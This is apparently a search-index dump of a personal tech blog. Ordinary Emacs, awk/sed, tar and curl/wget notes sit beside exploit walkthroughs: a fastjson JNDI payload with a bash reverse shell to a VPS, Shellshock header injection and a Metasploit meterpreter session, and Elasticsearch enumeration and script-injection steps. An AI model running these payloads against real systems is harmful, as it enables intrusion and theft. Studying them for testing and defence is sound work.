4 5 6  java -cp /tmp/fastjson_tool.jar fastjson.HRMIServer 47.106.65.x 1099 \u0026#34;bash=bash -i \u0026gt;\u0026amp; /dev/tcp/47.106.65.x/9999 0\u0026gt;\u0026amp;1\u0026#34; [-] payload: {\u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;,\u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://47.106.65.x:1099/Object\u0026#34;,\u0026#34;autoCommit\u0026#34;:true} [-] payload: {\u0026#34;e\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Class\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;},\u0026#34;f\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;,\u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://47.106.65.x:1099/Object\u0026#34;,\u0026#34;autoCommit\u0026#34;:true}} [-] Opening JRMP listener on 1099 ...   在vps上监听999端口 1  nc -lvvp 999   发送payload 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  POST /demo/login HTTP/1.1 Host: x.x.x.x Content-Length: 184 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Content-Type: application/json Origin: http://x.x.x.x Referer: http://x.x.x.x/demo/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510 Connection: close {\u0026#34;e\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Class\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;},\u0026#34;f\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;,\u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://47.106.65.x:1099/Object\u0026#34;,\u0026#34;autoCommit\u0026#34;:true}}   ","description":"","id":74,"section":"en","tags":null,"title":"fastjson_rce","uri":"http://crkmythical.github.io/en/blog/fastjson-rce/"},{"content":"编写进度\n   安装markdown-mode macOS 1  brew install markdown pandoc multimarkdown   1 2 3 4 5 6 7 8 9 10 11  (use-package markdown-mode :ensure t :commands (markdown-mode gfm-mode) :mode ((\u0026#34;README\\\\.md\\\\\u0026#39;\u0026#34; . gfm-mode) (\u0026#34;\\\\.md\\\\\u0026#39;\u0026#34; . markdown-mode) (\u0026#34;\\\\.markdown\\\\\u0026#39;\u0026#34; . markdown-mode)) :init (setq markdown-command (concat \u0026#34;/usr/local/bin/pandoc\u0026#34; \u0026#34; --from=markdown --to=html\u0026#34; \u0026#34; --standalone --mathjax --highlight-style=pygments\u0026#34;)))   前缀键    Prefix Function     C-c C-s 样式类   C-c C-l 链接   C-c C-i 图片   C-c C-c 命令类   C-c C-x 开关类    标记区域和移动    操作 keybinding function     标记段落 M-h    下一段 M-}    上一段 M-{    标记块 C-c M-h    下一块 C-M-}    上一块 C-M-{    标记section C-M-h    标记子标题区域 C-c C-M-h    右移 C-c \u0026gt;    左移 C-c \u0026lt;     预览和导出    操作 keybinding function     编译 C-c C-c m    预览 C-c C-c p    导出 C-c C-c e    导出+预览 C-c C-c v    打开 C-c C-c o    实时导出 C-c C-c l     Markdown 语法    操作 keybinding function     快捷键列表 C-c C-h C-h    折叠/展开 TAB    移动到父级标题 C-c C-u    移动到标题上一个 C-c C-p    移动到标题下一个 C-c C-n    移动到同级标题上一个 C-c C-b    移动到同级标题下一个 C-c C-f     标题    操作 keybinding function     自动设置标题 C-c C-s h/H    插入n级标题 C-c C-s/t \u0026lt;n\u0026gt;    上移标题 C-c \u0026lt;up\u0026gt;    下移标题 C-c \u0026lt;down\u0026gt;    升级标题 C-c \u0026lt;left\u0026gt;    降级标题 C-c \u0026lt;right\u0026gt;    水平分割线 C-c C-s -     文本    操作 keybinding function     斜体 C-c C-s i/e    粗体 C-c C-s b    标签 C-c C-s k    高亮     删除线 C-c C-s s    引用 C-c C-s q     链接    操作 keybinding function     URL C-c C-l markdown-insert-link   Image C-c C-i markdwon-insert-image   显示/关闭图片 C-c C-x C-i markdown-toggle-inline-images   打开URL C-c C-o markdown-follow-thing-at-point   下一个链接 M-n    上一个链接 M-p     代码    语法 keybinding     行内代码 C-c C-s c   代码块 C-c C-s C   编辑块 C-c '   开/关代码颜色 C-c C-x C-f    列表    操作 keybinding function     插入 C-c C-j    上移 C-c \u0026lt;up\u0026gt;    下移 C-c \u0026lt;down\u0026gt;    列右移 C-c \u0026lt;right\u0026gt;    列左移 C-c \u0026lt;left\u0026gt;     复选框    操作 keybinding function      C-c C-d     表格    语法 keybindings function     插入表格 C-c C-s t    行上移 C-c \u0026lt;up\u0026gt;    行下移 C-c \u0026lt;down\u0026gt;    列左移 C-c \u0026lt;left\u0026gt;    列右移 C-c \u0026lt;right\u0026gt;    删除行 C-c \u0026lt;S-up\u0026gt;    插入行 C-c \u0026lt;S-down\u0026gt;    删除列 C-c \u0026lt;S-left\u0026gt;    插入列 C-c \u0026lt;S-right\u0026gt;    行排序 C-c C-c ^    表格转置 C-c C-c t    区域转表 C-c C-c     Latex/数学公式    操作 keybinding function     开关支持 C-c C-x C-e     流程图 Mermaid\n在线编辑器\n其他 脚注    操作 keybinding function      C-c C-s f     C-c C-a f     邮箱 askding@qq.com\n1  \u0026lt;askding@qq.com\u0026gt;   强制分页 在 markdown 文本中需要分页的地方添入:\n1 2  \u0026lt;div STYLE=\u0026#34;page-break-after: always ;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;   文本换行 1  \u0026lt;br/\u0026gt;   参考\nMarkdown-mode\n","description":"","id":75,"section":"en","tags":[""],"title":"Markdown_of_Emacs","uri":"http://crkmythical.github.io/en/blog/markdown-of-emacs/"},{"content":"编写进度\n   EMACS(Editor MACroS)\n在 Emacs 中, 我们有一条规定:\n   key binding Description     C-\u0026lt;字符\u0026gt; 在输入 \u0026lt;字符\u0026gt; 时按住 Control   M-\u0026lt;字符\u0026gt; 在输入 \u0026lt;字符\u0026gt; 时按住 Alt   s-\u0026lt;字符\u0026gt; 在输入 \u0026lt;字符\u0026gt; 时按住 Super    Emacs帮助信息    key binding Description     C-h t 帮助-教程tutorial   C-h k 帮助-快捷键   C-h f 帮助-函数介绍functions   C-h v 帮助-变量介绍varialbes    窗口操作    key binding Description     C-x 0 关闭当前窗口   C-x 1 只保留当前窗口   C-x 2 水平分割窗口   C-x 3 垂直分割窗口   C-x o 切换窗口    缓冲区buffer操作    key binding Description     C-x C-b 打开buffer列表   C-x b 切换buffer   C-x \u0026lt;L/R\u0026gt; 切换buffer   C-x k 关闭buffer    文件操作 打开文件    key binding Description     C-x d 打开目录   C-x C-f 查找/创建文件    搜索    key binding Description     C-s 向下搜索   C-r 向上搜索    编辑文件/buffer 移动 C-u \u0026lt;num\u0026gt; \u0026lt;key\u0026gt; 执行\u0026lt;num\u0026gt;次\u0026lt;key\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  |M-\u0026lt;(开头)\t: C-l |\t: 居顶 |\tM-v(翻屏) |C-a(行首) :\tC-e(行尾) |M-a(句首)\t: M-e(句尾) |\t: |\tC-p(上行) |\t: C-l |\t(左移字符/单词)C-b/M-b ...|_(光标) .... C-f/M-f(右移字符/单词） 居中| : |\tC-n(下行) |\t: |\t: |\t: |\t: |\tC-v(翻屏) | : C-l |\t: 居底| :\tM-\u0026gt;(结尾)   删除 1 2 3 4 5  | : |M-k(删除光标至行首)\t...|_(光标)... C-k(光标至行尾、重复则删除换行符) | : | (删除字符)\u0026lt;DEL\u0026gt;/(移除单词)M-\u0026lt;DEL\u0026gt; .... |_(光标) .... C-d(删除字符/M-d(移除单词） | :   选择    key binding Description     C-@ 开启标记    复制/剪贴    key binding Description     M-w 复制   C-w 剪贴    粘贴    key binding Description     C-y 粘贴    撤销/重做    key binding Description     C-x u 仅撤销   C-/ 撤销/重做   C-_ 撤销/重做    保存    key binding Description     C-x C-s 保存当前buffer到对应文件   C-x s 保存所有buffer到对应文件    ","description":"","id":76,"section":"en","tags":null,"title":"emacs","uri":"http://crkmythical.github.io/en/blog/emacs/"},{"content":"编写进度\n    记住三个命令的运用形式\ngrep \u0026lsquo;字符\u0026rsquo; 文件 擅长查找文件内容\nsed \u0026lsquo;命令\u0026rsquo; 文件 擅长取行和替换\nawk \u0026lsquo;条件{命令}\u0026rsquo; 文件 擅长取列,统计\n  单引号内就是正则表达式的用法\n  awk 处理过程：\n 将文件中的第一行作为输入，然后将此行放入模式空间，并将此行(以换行符结束)赋给内部变量$0 字段分解(默认IFS为空格,可通过-F来修改)，切割整行内容，并将切割后的字段依次赋给$1,$2..$n ,NF=n, NR+=1（NR=0） 检查print函数需要打印的字段，从模式空间中取出字段对应的值，输出结果到屏幕以空格为分割(可通过内部变量OFS进行调整) 继续将第二行载入模式空间，并将其值存储在$0中，覆盖原来的内容 重复1-4  1 2 3 4 5 6  awk [options] \u0026#39;commands\u0026#39; filename awk [options] -f awk-script-file filename \u0026lt;commands\u0026gt;部分： 预处理 行处理 处理后 BEGIN{ } {} END{}   常见用法： 匹配+处理\n1  awk -F \u0026#34;[ :\\t]+\u0026#34; \u0026#39;BEGIN{ OFS=\u0026#34;--\u0026#34; } /\u0026lt;pattern\u0026gt;/{ if (\u0026lt;condition\u0026gt;) {\u0026lt;if_true_statment\u0026gt;} else{\u0026lt;if_false_statment\u0026gt;} } END{}\u0026#39; /path/to/file    -F \u0026quot;[ :\\t]+\u0026quot; 指定多个IFS,可以多个冒号和空格和tab键 NF 每行最后一列的$，将复制给NF, $NF 打印最后一列的值 , FNR用于多文件处理 NR 记录行号,从1开始 OFS 逗号,映射为OFS，初始情况下OFS变量是空格  awk分支语句结构 1  awk \u0026#39;/\u0026lt;pattern\u0026gt;/ { if( \u0026lt;condition\u0026gt; ) { if_true_statement } else if ( \u0026lt;condition\u0026gt; ) { elif_true_statement } else { elif_false_statement } }\u0026#39; /path/to/file   awk循环语句结构  while  1  awk -F : \u0026#39;{ i=1; while ( \u0026lt;condition\u0026gt; ) { while_true_statmen } }\u0026#39; /path/to/file    for  1  awk -F : \u0026#39; { for ( : : ) {for_true_statement} } \u0026#39; /path/to/file   打印指定行之间的文本 类似于cat -n\n1 2  awk \u0026#39;NR==M,NR==N {printf $1}\u0026#39; filename cat file | awk \u0026#39;NR==M,NR==N\u0026#39; #打印M行到N行之间的文本   打印模式之间行的文本 1  awk \u0026#39;/start_pattern/,/end_pattern/\u0026#39; filename   匹配指定列的内容 1 2  awk -F : \u0026#39;$3 ~ /alice/\u0026#39; /etc/passwd awk -F : \u0026#39;$3 !~ /alice/\u0026#39; /etc/passwd   sed sed命令若无语法错误，返回值永远是0\n1 2  sed [option] \u0026#39;\u0026lt;command\u0026gt;\u0026#39; /path/to/files sed [option] \u0026#39;s/\u0026lt;str_old\u0026gt;/\u0026lt;str_new\u0026gt;/\u0026lt;g/i\u0026gt;\u0026#39; /path/to/file     Options\n -e 允许多个'' -n 只输出匹配的行 -i 直接修改文件 -r 支持扩展元字符    参数 \u0026lsquo;//{\u0026lt;a;i;c;d\u0026gt;} [String]\u0026rsquo;\n a 追加后面 在当前行后添加一行/多行 i 追加前面 在当前行之前插入文本 c 行替换 在当前行进行替换/修改 d 删除 在当前行进行删除操作 sg 全局替换 p 打印匹配/指定的行    匹配ip地址 1 2 3 4 5  ifconfig eth0 | sed -rn \u0026#39;2s#(^.*inet) (.*) (net.*$)#\\2#gp\u0026#39; ifconfig eth0 | sed -rn \u0026#39;2s/(^.*inet) (.*) ( net.*$)/\\2/gp\u0026#39; ifconfig en0 | sed -rn \u0026#39;5s/(.*inet )(.*)( net.*)/\\2/gp\u0026#39; # mac本地ip ifconfig utun2 | sed -rn \u0026#39;2s/(^.*inet )(.*)( --\u0026gt;.*$)/\\2/gp\u0026#39;   grep/egrep 匹配ip地址 1  ifconfig eth0 | grep netmask | egrep \u0026#34;([0-9]|\\.){1,4}\u0026#34;   ","description":"","id":77,"section":"en","tags":null,"title":"awk-sed-grep-find","uri":"http://crkmythical.github.io/en/blog/awk-sed-grep-find/"},{"content":"编写进度\n tar(tape archive) 命令可以为Linux的文件和目录创建档案。  归档 1 2 3 4 5 6 7 8 9  tar -cf output.tar file1 file2 ... filen # 创建归档文件 ,-c创建 -f 归档文件名 tar -tvf archive.tar # 列出归档文件中的文件 tar -rf original.tar new_file # 向归档文件追加/替换文件 tar -uf archive.tar file1 # 更新归档中的指定文件 tar -df archive.tar # 查看归档中文件与系统中文件的差异 tar -f archive.tar --delete file1 file2 .. # 删除指定文件 tar -Af file1.tar file2.tar # 合并多个tar文件   压缩  -j : bunzip2格式 -z : gzip格式 --lzma : lzma格式  1 2  tar -acvf archive.tar.gz * --exclude \u0026#34;*.txt\u0026#34; # -a根据压缩文件命令自动选择压缩算法,排除指定文件(也可使用-X exclue_file) tar -acvf archive.tar.gz * --excluede-cvs --totals # 排除版本控制系统相关文件,显示压缩文件大小   解压 1 2  tar -axvf archive.tar.gz file1 file4 -C /path/to/extraction_directory # 根据压缩后缀自动选择解压算法,提取指定文件到指定目录 tar -xzvkpf archive.tar # 解压bunzip2格式文件，-k不覆盖本地已有文件 -p保留文件相关权限   Tips 1 2  tar -cvf - files/ --exclude-cvs | ssh user@server \u0026#34;tar xv -C /tmp\u0026#34; # 对file目录中的文件进行归档并将其输出到stdout(-代表stdout), 然后提取到远程系统中的/tmp目录   ","description":"","id":78,"section":"en","tags":null,"title":"TAR","uri":"http://crkmythical.github.io/en/blog/tar/"},{"content":"编写进度\n   GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，\n攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。\n此漏洞源于在调用bash shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在shell被调用后会被立即执行。\n 漏洞条件\nbash \u0026lt; 4.3  本地检测 1  env x=\u0026#39;() { :;}; echo Vulnerable CVE-2014-6271 \u0026#39; bash -c \u0026#34;echo test\u0026#34;   远程检测 victim.cig内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  #!/usr/local/bash-4.3.0/bin/bash echo \u0026#34;Content-type: text/html\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#39;\u0026lt;html\u0026gt;\u0026#39; echo \u0026#39;\u0026lt;head\u0026gt;\u0026#39; echo \u0026#39;\u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34;\u0026gt;\u0026#39; echo \u0026#39;\u0026lt;title\u0026gt;Bash ShellShock\u0026lt;/title\u0026gt;\u0026#39; echo \u0026#39;\u0026lt;/head\u0026gt;\u0026#39; echo \u0026#39;\u0026lt;body\u0026gt;\u0026#39; echo \u0026#39;\u0026lt;p\u0026gt;\u0026#39; echo \u0026#39;Hello world\u0026#39; echo \u0026#39;\u0026lt;/p\u0026gt;\u0026#39; echo \u0026#39;\u0026lt;/body\u0026gt;\u0026#39; echo \u0026#39;\u0026lt;/html\u0026gt;\u0026#39; exit 0   curl命令检测 1 2 3  curl -X GET \u0026#34;http://192.168.108.223:8080/victim.cgi\u0026#34; -H \u0026#39;User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id\u0026#39; uid=33(www-data) gid=33(www-data) groups=33(www-data)   msf利用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  search shellshock Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/apache_mod_cgi_bash_env 2014-09-24 normal Yes Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner 1 auxiliary/server/dhclient_bash_env 2014-09-24 normal No DHCP Client Bash Environment Variable Code Injection (Shellshock) 2 exploit/linux/http/advantech_switch_bash_env_exec 2015-12-01 excellent Yes Advantech Switch Bash Environment Variable Code Injection (Shellshock) 3 exploit/linux/http/ipfire_bashbug_exec 2014-09-29 excellent Yes IPFire Bash Environment Variable Injection (Shellshock) 4 exploit/multi/ftp/pureftpd_bash_env_exec 2014-09-24 excellent Yes Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock) 5 exploit/multi/http/apache_mod_cgi_bash_env_exec 2014-09-24 excellent Yes Apache mod_cgi Bash Environment Variable Code Injection (Shellshock) 6 exploit/multi/http/cups_bash_env_exec 2014-09-24 excellent Yes CUPS Filter Bash Environment Variable Code Injection (Shellshock) 7 exploit/multi/misc/legend_bot_exec 2015-04-27 excellent Yes Legend Perl IRC Bot Remote Code Execution 8 exploit/multi/misc/xdh_x_exec 2015-12-04 excellent Yes Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution 9 exploit/osx/local/vmware_bash_function_root 2014-09-24 normal Yes OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock) 10 exploit/unix/dhcp/bash_environment 2014-09-24 excellent No Dhclient Bash Environment Variable Injection (Shellshock) 11 exploit/unix/smtp/qmail_bash_env_exec 2014-09-24 normal No Qmail SMTP Bash Environment Variable Injection (Shellshock) Interact with a module by name or index. For example info 11, use 11 or use exploit/unix/smtp/qmail_bash_env_exec msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt; options Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec): Name Current Setting Required Description ---- --------------- -------- ----------- CMD_MAX_LENGTH 2048 yes CMD max line length CVE CVE-2014-6271 yes CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278) HEADER User-Agent yes HTTP header to use METHOD GET yes HTTP method to use Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 192.168.108.223 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPATH /bin yes Target PATH for binaries used by the CmdStager RPORT 8080 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI victim.cgi yes Path to CGI script TIMEOUT 5 yes HTTP read response timeout (seconds) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.108.223 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Linux x86 msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt; run [*] Started reverse TCP handler on 192.168.108.223:4444 [*] Command Stager progress - 100.46% done (1097/1092 bytes) [*] Sending stage (976712 bytes) to 192.168.108.223 [*] Meterpreter session 4 opened (192.168.108.223:4444 -\u0026gt; 192.168.108.223:53118) at 2021-01-08 16:22:26 +0800 meterpreter \u0026gt;   ","description":"","id":79,"section":"en","tags":null,"title":"Shellshock","uri":"http://crkmythical.github.io/en/blog/shellshock/"},{"content":"编写进度\n   curl curl是一个精简的命令行浏览器,调试API,类似于postman、Apifox\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  curl [-X GET/POST/HEAD/PUT] \\# 请求方法设置 [-G ] # 请求头设置 [-H \u0026#39;xx: xx\u0026#39;] \\# 设置请求头信息 [-A \u0026#39;Mozilla/5.0***\u0026#39;] \\# 指定User-Agent [-b \u0026#39;foo=bar\u0026#39;] \\# 指定cookie [-c cookies.txt] \\# 指定cookie [-e \u0026#39;https://xxx\u0026#39;] \\# 设定Referer [-D respHeader.txt] \\# 将服务器响应头信息保存到respHeader.txt 即cookie [-r 0-100 ] \\# 设定Range: bytes=start-end 请求资源的部分内容 # 数据设置 [-d \u0026#39;xx\u0026#39;] \\# POST请求数据(自动设置Content-Type: application/x-www-form-urlencoded) [-d @local_file] \\# POST请求数据 [--data-urlencode \u0026#39;xx\u0026#39;] \\# 等同于-d,但会对数据进行url编码 [-F \u0026#39;file=@photo.png;filename=me.png;type=application/octet-stream\u0026#39;] \\# 上传二进制文件photo.png(自动设置Content-Type: multipart/form-data, MIME:application/octet-stream 服务器收到的文件名为me.png) # 认证信息 [-u \u0026#39;bob:12345\u0026#39;] \\# 用户密码(自动设置Authorization: Basic Ym9iOjEyMzQ1) # 代理设置 [--no-proxy proxyserver] \\# 跳过passwd@proxyserver代理 [-x user:passwd@proxyserver:port] \\# 默认HTTP代理 [-x socks4://user:passwd@proxyserver:port] \\# socks4代理 [-x socks5://user:passwd@proxyserver:port] \\# socks5代理 # 其他设置 [-s] \\# slient模式 [--interface eth1 ] \\# 指定网卡 [--local-port] \\# 指定源端口 [-S] \\# 仅输出错误信息 [-k] \\# 跳过SSL检测 [-v] \\# 显示请求过程 [-#] \\# 显示进度条 [-I] \\# 显示请求头 =[-X HEAD] [-i] \\# 显示响应头 [-C -] \\# 断点续传 [-L] \\# 自动重定向 [-o example.html] \\# 保存html页面 [-O ] \\# 保存与服务器url中同名的文件名   常用格式 1  curl -X \u0026lt;VERB\u0026gt; \u0026#39;\u0026lt;PROTOCOL\u0026gt;://\u0026lt;HOST\u0026gt;:\u0026lt;PORT\u0026gt;/\u0026lt;PATH\u0026gt;?\u0026lt;QUERY_STRING\u0026gt;\u0026#39; -d \u0026#39;\u0026lt;BODY\u0026gt;\u0026#39;      参数 描述     VERB 适当的 HTTP 方法 或 谓词 : GET、 POST、 PUT、 HEAD 或者 DELETE。   PROTOCOL http 或者 https（如果你在 Elasticsearch 前面有一个 https 代理）   HOST Elasticsearch 集群中任意节点的主机名，或者用 localhost 代表本地机器上的节点。   PORT 运行 Elasticsearch HTTP 服务的端口号，默认是 9200 。   PATH API 的终端路径（例如 _count 将返回集群中文档数量）。Path 可能包含多个组件，例如：_cluster/stats 和 _nodes/stats/jvm 。   QUERY_STRING 任意可选的查询字符串参数 (例如 ?pretty 将格式化地输出 JSON 返回值，使其更容易阅读)   BODY 一个 JSON 格式的请求体 (如果请求需要的话)    curl上传文件 1 2 3 4 5  \u0026lt;form action=\u0026#34;submit.cgi\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; Name: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;person\u0026#34;\u0026gt;\u0026lt;br\u0026gt; File: \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;secret\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt;   1  curl -F person=anonymous -F secret=@file.txt http://example.com/submit.cgi   发送JSON格式的请求 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  curl -XGET \u0026#39;http://localhost:9200/_count?pretty\u0026#39; -d \u0026#39; { \u0026#34;query\u0026#34;: { \u0026#34;match_all\u0026#34;: {} } } \u0026#39; { \u0026#34;count\u0026#34; : 0, \u0026#34;_shards\u0026#34; : { \u0026#34;total\u0026#34; : 5, \u0026#34;successful\u0026#34; : 5, \u0026#34;failed\u0026#34; : 0 } }   wget wget是一个下载工具\n1 2 3 4 5 6 7 8 9 10  wget [-t 5] \\ #网络不稳定导致的终端，重试下载次数,0表示不断重试 [-O output_name] \\ # 指定输出文件名 [--limit-rate 20k] \\# 限速 20k [-c] \\ # 断点续传 [--mirror --convert-links] \\# 复制整个网站 [-r] \\# 递归下载 [--user username --password pass] \\# 提供身份验证 [--user-agent=\u0026#34;Mozilla/5.0\u0026#34;] \\ #指定user-agent [-P /tmp] \\ #指定下载目录 URL1 URL2 ... URLn   ","description":"","id":80,"section":"en","tags":null,"title":"curl-wget","uri":"http://crkmythical.github.io/en/blog/curl-wget/"},{"content":"编写进度\n   Elasticsearch是一个使用java开发的基于Lucene库的开源的高扩展的分布式全文搜索引擎。\n它可以近乎实时存储、检索数据,具有HTTP Web接口和无模式JSON文档。\n默认端口：\n 9200 http端口 9300 数据传输端口 组播端口(UDP) 54328  Elasticsearch API\nInfomation CURL\n1  curl http://10.200.88.6:9201 ｜ grep \u0026#34;You Know, for Search\u0026#34;   Nmap\n1 2 3 4 5 6 7 8 9  nmap -Pn -T4 -sV -p 9201 10.200.88.6 Nmap scan report for 10.200.88.6 Host is up (0.059s latency). PORT STATE SERVICE VERSION 9200/tcp open http Elasticsearch REST API 5.6.10 (name: 10.200.88.6; cluster: mscp-elasticsearch; Lucene 6.6.1) Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds   漏洞利用 cat API\n1  GET /_cat/nodes?h=ip,port,heapPercent,name   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  curl http://10.200.88.6:9201/_cat # 查看cat的功能  /_cat/nodes /_cat/tasks /_cat/indices /_cat/indices/{index} curl \u0026#34;http://10.200.88.6:9201/_cat/indices?v\u0026#34; health status index uuid pri rep docs.count docs.deleted store.size pri.store.size green open onc_v1_lb-2020-12-17 Ik3EFySWRyC2Nufv99iYpA 3 1 2304 0 713.1kb 356.7kb green open onc_v1_lb-2021-01-02 ewkYI6EuR--3PtesQsfZag 3 1 2304 0 724.1kb 362.1kb green open test gQHpUySfQaep7vfWs0zJzg 3 1 2 0 13.9kb 6.9kb curl http://10.200.88.6:9201/_nodes # 查看节点数据 {\u0026#34;_nodes\u0026#34;:{\u0026#34;total\u0026#34;:3,\u0026#34;successful\u0026#34;:3,\u0026#34;failed\u0026#34;:0},\u0026#34;cluster_name\u0026#34;:\u0026#34;mscp-elasticsearch\u0026#34;,\u0026#34;nodes\u0026#34;:{\u0026#34;-6isCA5RTaeItZlabhGf6A\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;10.200.88.8\u0026#34;,\u0026#34;transport_address\u0026#34;:\u0026#34;10.200.88.8:9301\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;10.200.88.8\u0026#34;,\u0026#34;ip\u0026#34;:\u0026#34;10.200.88.8\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;5.6.10\u0026#34;,\u0026#34;build_hash\u0026#34;:\u0026#34;b727a60\u0026#34;,\u0026#34;total_indexing_buffer\u0026#34;:830360780,\u0026#34;roles\u0026#34;:[\u0026#34;master\u0026#34;,\u0026#34;data\u0026#34;,\u0026#34;ingest\u0026#34;],\u0026#34;attributes\u0026#34;:{\u0026#34;ml.max_open_jobs\u0026#34;:\u0026#34;10\u0026#34;,\u0026#34;ml.enabled\u0026#34;:\u0026#34;true\u0026#34;},\u0026#34;settings\u0026#34;:{\u0026#34;cluster\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;mscp-elasticsearch\u0026#34;}{\u0026#34;type\u0026#34;:\u0026#34;set\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;set_security_user\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;sort\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;split\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;trim\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;uppercase\u0026#34;},{\u0026#34;type\u0026#34;:\u0026#34;user_agent\u0026#34;}]}   EXP 创建一条测试数据 该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据\n1 2 3  curl -X POST \u0026#34;http://10.200.88.6:9201/website/blog\u0026#34; -d \u0026#39;{\u0026#34;name\u0026#34;:\u0026#34;test\u0026#34;}\u0026#39; {\u0026#34;_index\u0026#34;:\u0026#34;website\u0026#34;,\u0026#34;_type\u0026#34;:\u0026#34;blog\u0026#34;,\u0026#34;_id\u0026#34;:\u0026#34;AXbXVwBUIRRtVWWNffFo\u0026#34;,\u0026#34;_version\u0026#34;:1,\u0026#34;result\u0026#34;:\u0026#34;created\u0026#34;,\u0026#34;_shards\u0026#34;:{\u0026#34;total\u0026#34;:2,\u0026#34;successful\u0026#34;:2,\u0026#34;failed\u0026#34;:0},\u0026#34;created\u0026#34;:true}   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  curl -X POST \u0026#34;http://10.200.88.6:9201/_search?pretty\u0026#34; -d \u0026#39;{\u0026#34;size\u0026#34;:1, \u0026#34;script_fields\u0026#34;: {\u0026#34;lupin\u0026#34;:{\u0026#34;script\u0026#34;: \u0026#34;1+665\u0026#34;}}}\u0026#39; -v { \u0026#34;took\u0026#34; : 5, \u0026#34;timed_out\u0026#34; : false, \u0026#34;_shards\u0026#34; : { \u0026#34;total\u0026#34; : 102, \u0026#34;successful\u0026#34; : 102, \u0026#34;skipped\u0026#34; : 0, \u0026#34;failed\u0026#34; : 0 }, \u0026#34;hits\u0026#34; : { \u0026#34;total\u0026#34; : 68637, \u0026#34;max_score\u0026#34; : 1.0, \u0026#34;hits\u0026#34; : [ { \u0026#34;_index\u0026#34; : \u0026#34;onc_v1_lb-2020-12-08\u0026#34;, \u0026#34;_type\u0026#34; : \u0026#34;vperf\u0026#34;, \u0026#34;_id\u0026#34; : 